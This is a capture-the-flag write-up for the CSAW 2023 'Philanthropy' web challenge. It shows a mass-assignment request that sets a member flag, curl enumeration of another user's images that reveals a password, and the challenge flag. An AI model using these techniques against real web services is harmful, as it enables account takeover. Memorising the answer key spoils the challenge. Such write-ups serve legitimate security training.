# Philanthropy

- source code: [CSAW-CTF-2023-Quals/web/philanthropy at main · osirislab/CSAW-CTF-2023-Quals](https://github.com/osirislab/CSAW-CTF-2023-Quals/tree/main/web/philanthropy)

## Setup

```bash
sed -i -e 's/13336/4657/g' docker-compose.yml
docker-compose up
echo 127.0.0.1 web.csaw.io | tee -a /etc/hosts
```

## Flag

csawctf{K3pt_y0u_Wa1t1ng_HUh}

## Solution

1. Sign up and Login user

1. Add `"member": true` key:value in POST http://web.csaw.io:14180/identity/update (Mass Assignment Vulnerability)

    request:
    ```text
    POST /identity/update HTTP/1.1
    Host: web.csaw.io:14180
    Content-Length: 79
    Content-Type: application/json
    Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5NTY0MzY3NSwianRpIjoiMzY2MzM4NDMtZWYzNy00ZDBiLWE1ZmMtMzUyZTRmZmQ5OTZjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QxQGV4YW1wbGUuY29tIiwibmJmIjoxNjk1NjQzNjc1LCJleHAiOjE2OTU2NDQ1NzUsIm1lbWJlciI6dHJ1ZX0.mEpDfwkLblui-Yj_ASkp2rMljgEXBhWNsku5FU5HVXQ
    
    {"username":"test1@example.com","first_name":"a","last_name":"c","member":true}
    ```

1. Opening [Identify](http://web.csaw.io:14180/web/identify), I can see GET http://web.csaw.io:14180/identity/images?user=%22otacon@protonmail.com%22 request.
   There is the email address `solidsnake@protonmail.com` in response.
   
    ```console
    root@kali:~/ctf/CSAW-CTF-2023-Quals/web/philanthropy# curl -s http://web.csaw.io:14180/identity/images?user=%22otacon@protonmail.com%22 | jq
    {
      "msg": [
    (snip)
        {
          "credit": "solidsnake@protonmail.com",
          "filename": "a267d18b-e1b1-4fc4-9fa9-97df1b55b7c2.png",
          "mg_model": "RAY",
          "submitter": "otacon@protonmail.com"
        },
    ```
      
   So requests http://web.csaw.io:14180/identity/images?user=%22solidsnake@protonmail.com%22 with changing parameter.

    ```console
    root@kali:~/ctf/CSAW-CTF-2023-Quals/web/philanthropy# curl http://web.csaw.io:14180/identity/images?user=%22solidsnake@protonmail.com%22
    {"msg":[{"credit":"N/A","filename":"b6116d5a-a415-4438-8f43-2b4cb648593e.png","mg_model":"NULL","submitter":"solidsnake@protonmail.com"}]}
    ```

    Opening http://web.csaw.io:14180/images/b6116d5a-a415-4438-8f43-2b4cb648593e.png, there is Snake's password.So login Snake's credential, then open [Flag](http://web.csaw.io:14180/web/flag) to get flag.
